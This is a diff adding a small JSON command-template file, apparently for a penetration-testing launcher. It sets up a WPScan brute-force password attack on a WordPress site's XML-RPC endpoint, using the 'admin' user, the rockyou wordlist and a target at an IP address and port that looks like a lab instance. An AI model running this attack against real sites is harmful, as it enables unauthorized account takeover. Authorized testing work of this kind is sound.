@@ -1,0 +1,34 @@
+{
+  "name": "WordPress XMLRPC Attack via WPScan",
+  "description": "",
+  "variables": [
+    {
+      "name": "TARGET_URL",
+      "value": "http://154.57.164.66:31010",
+      "description": ""
+    },
+    {
+      "name": "Admin_Name",
+      "value": "admin",
+      "description": ""
+    },
+    {
+      "name": "Wordlist_Password",
+      "value": "/usr/share/wordlists/rockyou.txt",
+      "description": ""
+    },
+    {
+      "name": "Wordlist_Users",
+      "value": "placeholder",
+      "description": ""
+    }
+  ],
+  "commands": [
+    {
+      "label": "WordPress wmlrpc brute force",
+      "template": "wpscan --password-attack xmlrpc -U admin -P {{Wordlist_Password}} --url {{TARGET_URL}}",
+      "description": "",
+      "enabled": true
+    }
+  ]
+}
